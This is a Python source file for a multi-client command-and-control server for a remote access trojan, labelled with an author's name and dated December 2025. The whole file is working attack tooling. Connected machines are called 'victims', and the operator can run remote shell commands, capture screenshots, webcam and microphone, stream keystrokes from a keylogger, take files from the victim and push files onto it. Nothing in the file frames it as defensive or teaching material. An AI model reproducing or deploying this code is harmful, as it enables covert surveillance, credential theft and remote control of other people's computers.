# FINAL MULTI-CLIENT C2 SERVER - NOOR UL HASSAN (DEC 2025)
import socket
import threading
import os
from datetime import datetime

clients = {}           # {conn: {"addr": ..., "shell": "CMD", "info": "...", "name": "Victim-1"}}
lock = threading.Lock()

def handle_client(conn, addr):
    global clients
    try:
        print(f"\n[+] New victim → {addr[0]}:{addr[1]}")
        conn.sendall(b"CMD")  # default shell
        with lock:
            name = f"Victim-{len(clients)+1}"
            clients[conn] = {"addr": addr, "shell": "CMD", "name": name, "info": "Not collected"}

        while True:
            cmd = input(f"{clients[conn]['name']}@{clients[conn]['shell']}> ")
            
            if cmd == "list":
                print("\n=== Active Victims ===")
                for c in clients:
                    print(f"{clients[c]['name']} → {clients[c]['addr'][0]} → {clients[c]['info']}")
                print("================\n")
                continue
            elif cmd.startswith("select "):
                try:
                    num = int(cmd.split()[1]) - 1
                    target = list(clients.keys())[num]
                    print(f"→ Switched to {clients[target]['name']}")
                    continue
                except:
                    print("Invalid number")
                    continue
            elif cmd == "exit":
                conn.close()
                break

            if cmd in ["ss", "webcam", "mic"]:
                conn.sendall(cmd.encode())
                save_as = input("    Save as: ")
                with open(save_as, "wb") as f:
                    while True:
                        data = conn.recv(4096)
                        if b"Sended" in data or b"FILE_SENT" in data:
                            f.write(data.replace(b"Sended", b"").replace(b"FILE_SENT", b""))
                            break
                        f.write(data)
                print(f"[+] Saved → {save_as}")

            elif cmd.startswith("download "):
                path = cmd[9:]
                conn.sendall(f"download {path}".encode())
                save_as = input("    Save as: ")
                with open(save_as, "wb") as f:
                    while True:
                        data = conn.recv(4096)
                        if b"FILE_SENT" in data or b"FILE_NOT_FOUND" in data:
                            if b"FILE_NOT_FOUND" in data:
                                print("[-] File not found on victim")
                            break
                        f.write(data)
                if os.path.exists(save_as):
                    print(f"[+] Downloaded → {save_as}")

            elif cmd == "upload":
                path = input("    File to upload: ")
                if os.path.exists(path):
                    conn.sendall(f"upload {os.path.basename(path)}".encode())
                    with open(path, "rb") as f:
                        while chunk := f.read(4096):
                            conn.sendall(chunk)
                        conn.sendall(b"DONE")
                    print(f"[+] Uploaded {path}")
                else:
                    print("File not found")

            elif cmd == "sysinfo":
                conn.sendall(b"sysinfo")
                info = conn.recv(4096).decode(errors="ignore")
                print(info)
                with lock:
                    clients[conn]["info"] = info.strip().split("\n")[1] if "\n" in info else addr[0]

            elif cmd == "keylog":
                conn.sendall(b"keylog")
                print("[+] Keylogger started — keys will appear below:")
                while True:
                    try:
                        key = conn.recv(1024).decode(errors="ignore")
                        if not key or "exit" in key.lower():
                            break
                        print(f"KEY → {key.strip()}", end="", flush=True)
                    except:
                        break

            else:
                conn.sendall(cmd.encode())
                response = conn.recv(32000).decode(errors="ignore")
                print(response, end="")

    except:
        pass
    finally:
        with lock:
            if conn in clients:
                print(f"[-] Lost → {clients[conn]['name']} ({addr[0]})")
                del clients[conn]
        conn.close()

def main():
    s = socket.socket()
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("", 443))        # YOUR AZURE PORT
    s.listen(50)
    print("[+] Multi-Client C2 Server Running on port 443")
    print("   Commands: list | select <num> | ss | webcam | mic | keylog | upload | download <path> | sysinfo\n")

    while True:
        try:
            conn, addr = s.accept()
            threading.Thread(target=handle_client, args=(conn, addr), daemon=True).start()
        except:
            break

if __name__ == "__main__":
    main()
